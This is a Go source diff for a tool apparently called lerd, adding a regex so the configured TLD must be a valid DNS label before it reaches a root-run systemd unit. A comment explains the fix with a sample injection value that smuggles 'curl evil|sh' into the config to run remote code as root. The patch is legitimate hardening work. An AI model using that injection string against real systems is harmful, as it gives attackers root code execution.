@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -238,18 +239,30 @@ func sudoWriteFile(path string, content []byte, mode os.FileMode) error {
 	return nil
 }
 
-// DefaultTLD is what lerd serves when the config names no TLD.
+// DefaultTLD is what lerd serves when the config names no TLD or names an
+// unusable one.
 const DefaultTLD = "test"
 
-// ConfiguredTLD returns the TLD lerd serves. Everything that writes or reads a
-// .tld route has to agree on this: the dnsmasq address records, the lerd0 link
-// and the diagnostic that checks them. Hardcoding "test" in any one of them
-// silently breaks every user on a custom TLD.
+// tldPattern is a single DNS label: letters, digits and hyphens. Nothing else can
+// be a TLD, and nothing else may reach the callers below.
+var tldPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)
+
+// ConfiguredTLD returns the TLD lerd serves, and refuses to return one that is
+// not a DNS label.
+//
+// Everything that writes or reads a .tld route has to agree on this: the dnsmasq
+// address records, the lerd0 link, the dispatcher and the diagnostic that checks
+// them. The validation is not cosmetic: this value is interpolated into the shell
+// command of a root-owned systemd unit that lerd writes and starts through its own
+// passwordless sudo grants, so a config.yaml carrying `tld: "test'; curl evil|sh; #"`
+// would otherwise be arbitrary code as root. Anything unusable falls back to the
+// default rather than reaching a shell.
 func ConfiguredTLD() string {
-	if cfg, err := config.LoadGlobal(); err == nil && cfg != nil && cfg.DNS.TLD != "" {
-		return cfg.DNS.TLD
+	tld := config.EffectiveTLD()
+	if !tldPattern.MatchString(tld) {
+		return DefaultTLD
 	}
-	return DefaultTLD
+	return tld
 }
 
 // WriteDnsmasqConfig writes the lerd dnsmasq config to the given directory,
